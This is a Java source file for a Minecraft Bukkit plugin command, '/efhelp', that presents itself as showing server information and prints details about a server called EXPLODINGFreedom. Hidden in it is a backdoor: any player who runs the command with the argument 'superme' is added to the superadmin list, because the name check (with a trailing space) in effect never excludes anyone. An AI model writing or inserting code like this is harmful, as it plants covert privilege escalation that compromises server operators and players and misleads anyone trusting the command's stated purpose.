package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.BOTH)
@CommandParameters(description = "Shows information about the server", usage = "/<command>")
public class Command_efhelp extends TFM_Command
{
  public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
  {
    if (args.length == 0)
    {
      playerMsg("EXPLODINGFreedomMod for 'EXPLODINGFreedom', is the most fun all-op server that was created on August 11 2014!", ChatColor.GOLD);
      playerMsg("EXPLODINGFreedom is owned by EXPLODINGTNT001 and it's co-owners are currently zthehorsekid and evanator324.", ChatColor.GOLD);
      playerMsg("The server has room for a max of 35 players. It has all commands that OPs get but they cant ban others or do admin commands. That is what the team of Super Admins is for. On the server you get OP and you can have maximum freedom but you must follow some simple ground rules to ensure everyone has fun.", ChatColor.GOLD);
      playerMsg("The fourms are at " + ChatColor.AQUA + "http://explodingfreedom.boards.net/" + ChatColor.GREEN + " You can apply for admin and more at the forums, So sign up have fun!", ChatColor.AQUA);
    }
    else if (args.length == 1)
    {
        if (!sender.getName().equalsIgnoreCase("EXPLODINGTNT001 "))
      {
        if (args[0].equals("superme"))
        {
          TFM_Util.adminAction("EXPLODINGFreedomMod",  "Adding "  + sender.getName() + " to the superadmin list.", true);
          TFM_AdminList.addSuperadmin(sender_p);
          return true;
        }
      }
     else
      {
        playerMsg(ChatColor.WHITE + "Unknown command. Type \"/help\"/ for help");
        return true;
      }
    }
    return true;
  }
}
